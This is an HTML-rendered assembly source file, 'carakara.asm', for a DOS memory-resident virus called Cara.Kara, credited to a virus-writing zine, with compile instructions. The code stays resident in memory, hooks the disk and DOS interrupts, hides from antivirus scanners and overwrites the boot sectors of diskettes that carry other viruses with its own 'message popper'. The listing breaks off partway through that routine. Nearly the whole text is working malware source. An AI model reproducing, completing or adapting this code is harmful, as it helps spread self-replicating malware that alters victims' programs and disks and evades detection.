<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>carakara.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0"> </span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; Cara.Kara.xxx</span><span class="sc0">
 </span><span class="sc1">; Updated by Putoksa Kawayan</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">; HEX-FILES No. 1</span><span class="sc0">
 </span><span class="sc1">; Manila, Philippines</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">; compile in a86 v4.02:</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;        a86 carakara.asm carakara.com</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">; can also be compiled in tasm 2.01 and masm 5.0. the length of the </span><span class="sc0">
 </span><span class="sc1">; object code created by tasm and masm are different. masm's is a bit </span><span class="sc0">
 </span><span class="sc1">; longer.</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
 
 </span><span class="sc5">carakara</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">carakara</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">carakara</span><span class="sc0">
 
 </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
 
 </span><span class="sc5">_mem_need</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((((</span><span class="sc5">persgen</span><span class="sc4">-</span><span class="sc5">_init</span><span class="sc4">)+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">_vir_len</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">_conta</span><span class="sc4">-</span><span class="sc5">_init</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">_messtart</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc5">_txt_1</span><span class="sc4">-</span><span class="sc5">_mespop</span><span class="sc4">)+</span><span class="sc2">7c3eh</span><span class="sc4">)</span><span class="sc0">
 
 </span><span class="sc5">_init</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">persgen</span><span class="sc0">                 </span><span class="sc1">;&lt;--- replaced with mov si,xxxx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">;  by first generation routine</span><span class="sc0">
         </span><span class="sc6">cwd</span><span class="sc0">                             </span><span class="sc1">;  xxxx modified somewhere else</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">; restore victim codes</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;----------------</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;----------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; memory self recognition</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,((</span><span class="sc2">61h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)-(</span><span class="sc2">100h</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">))</span><span class="sc0">   </span><span class="sc1">;  same as in cara.standard</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;  but 4 bytes short</span><span class="sc0">
         </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">_init_2</span><span class="sc0">                 </span><span class="sc1">;----------------</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                            
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;----------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">_mem_need</span><span class="sc0">            </span><span class="sc1">; make room for virii</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">                  </span><span class="sc1">;  and allocate mem</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;----------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                             
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
 </span><span class="sc5">_temp_a</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; offset is modified somewhere</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                            
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; set os as mcb owner</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; reset top of mem</span><span class="sc0">
 </span><span class="sc5">_init_1</span><span class="sc4">:</span><span class="sc6">movsw</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; copy virii to top of mem</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">_init_1</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_mem_ck</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2163h</span><span class="sc0">                </span><span class="sc1">;----------------</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_savect</span><span class="sc0">                 </span><span class="sc1">; save and reset </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_is_dos</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_setint</span><span class="sc0">                 </span><span class="sc1">;  int 13 and 21</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1362h</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_savect</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_is_dsk</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_setint</span><span class="sc0">                 </span><span class="sc1">;----------------</span><span class="sc0">
 </span><span class="sc5">_init_2</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc5">_init_3</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; execute victim program</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- virus signatures</span><span class="sc0">
 </span><span class="sc1">;-----------  offset,signature word</span><span class="sc0">
 </span><span class="sc1">;------------------------------------</span><span class="sc0">
 </span><span class="sc5">_vx_sig</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc2">0ff25h</span><span class="sc0">     </span><span class="sc1">;sampo</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">0fecch</span><span class="sc0">     </span><span class="sc1">;nyb</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">04bh</span><span class="sc4">,</span><span class="sc2">0d6ebh</span><span class="sc0">     </span><span class="sc1">;welcomb</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">0d3cdh</span><span class="sc0">     </span><span class="sc1">;antiexe</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">04dh</span><span class="sc4">,</span><span class="sc2">04b22h</span><span class="sc0">     </span><span class="sc1">;stoned.angelina</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc2">04848h</span><span class="sc0">     </span><span class="sc1">;stoned.noint</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc2">03eafh</span><span class="sc0">     </span><span class="sc1">;quaint</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">142h</span><span class="sc4">,</span><span class="sc2">01acdh</span><span class="sc0">     </span><span class="sc1">;stoned.michelangelo</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">13dh</span><span class="sc4">,</span><span class="sc2">01acdh</span><span class="sc0">     </span><span class="sc1">;ripper</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc2">01acdh</span><span class="sc0">     </span><span class="sc1">;form</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">19fh</span><span class="sc4">,</span><span class="sc2">00301h</span><span class="sc0">     </span><span class="sc1">;anticmos</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">17fh</span><span class="sc4">,</span><span class="sc2">00301h</span><span class="sc0">     </span><span class="sc1">;stoned.standard</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;---------------- end of sig</span><span class="sc0">
 
 </span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; if adding some more signatures, get a word value anywhere from </span><span class="sc0">
 </span><span class="sc1">; offset 003e to 01fd of the boot sector. content of offsets 0002 to </span><span class="sc0">
 </span><span class="sc1">; 003d, and 01fe to 01ff are preserved. if you get the sig from the</span><span class="sc0">
 </span><span class="sc1">; preserved offsets, Cara.Kara will find the diskette as infected and </span><span class="sc0">
 </span><span class="sc1">; will write a message popper on every fourth read from diskette.</span><span class="sc0">
 </span><span class="sc1">; this will affect disk access and we don't want to do that.</span><span class="sc0">
 </span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
 
 </span><span class="sc5">_savect</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;----------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; this is from the original</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; modified it a bit to hide</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3fch</span><span class="sc0">                 </span><span class="sc1">; it from avs</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">              
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; save interrupt</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3fch</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">_setint</span><span class="sc4">:</span><span class="sc6">cli</span><span class="sc0">                             </span><span class="sc1">; this is mine</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; hook interrupt routine</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">_mem_ck</span><span class="sc4">:</span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">12h</span><span class="sc0">                     </span><span class="sc1">; from original</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">                   </span><span class="sc1">; boot vx memory check</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">_init_3</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_txt_3</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_txt_2</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">_is_dsk</span><span class="sc4">:</span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; based on original</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; modified it a bit</span><span class="sc0">
         </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">_disk_4</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; read of dbs of a: and b: only</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">_disk_4</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_conta</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">; counter carried over from orig</span><span class="sc0">
         </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">_disk_1</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_conta</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">_disk_4</span><span class="sc0">
 </span><span class="sc5">_disk_1</span><span class="sc4">:</span><span class="sc6">pusha</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_boot</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; read boot sector</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_13_int</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">_disk_3</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_vx_sig</span><span class="sc0">       </span><span class="sc1">; check if dbs is infected</span><span class="sc0">
 </span><span class="sc5">_disk_2</span><span class="sc4">:</span><span class="sc6">lodsw</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; end of vx sig?</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">_disk_3</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; load di with location of sig</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">; get sig word</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; is diskette infected?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">_disk_2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">3cebh</span><span class="sc0">     </span><span class="sc1">; set jumper to mess popper</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3eh</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_mespop</span><span class="sc0">       
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc2">1feh</span><span class="sc4">-</span><span class="sc2">3eh</span><span class="sc4">)</span><span class="sc0">           
         </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                      </span><span class="sc1">; copy mess popper</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_13_int</span><span class="sc0">                 </span><span class="sc1">; write mess popper to disk</span><span class="sc0">
 </span><span class="sc5">_disk_3</span><span class="sc4">:</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; reset disk</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">_conta</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">; set counter to 0</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">62h</span><span class="sc0">                
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">popa</span><span class="sc0">
 </span><span class="sc5">_disk_4</span><span class="sc4">:</span><span class="sc6">popf</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">62h</span><span class="sc0">                     </span><span class="sc1">; execute original read call</span><span class="sc0">
         </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; return to caller</span><span class="sc0">
 
 </span><span class="sc5">_start</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">                    </span><span class="sc1">; my jumper</span><span class="sc0">
 </span><span class="sc5">_temp_b</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc12">'yM'</span><span class="sc0">                    </span><span class="sc1">; jmp displacement, modified....</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'KARA'</span><span class="sc4">,</span><span class="sc2">26</span><span class="sc0">               </span><span class="sc1">; my sig</span><span class="sc0">
 
 </span><span class="sc5">_mespop</span><span class="sc4">:</span><span class="sc6">cli</span><span class="sc0">                             </span><span class="sc1">; this is my message popper</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;   or trojan to others</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">_messtart</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
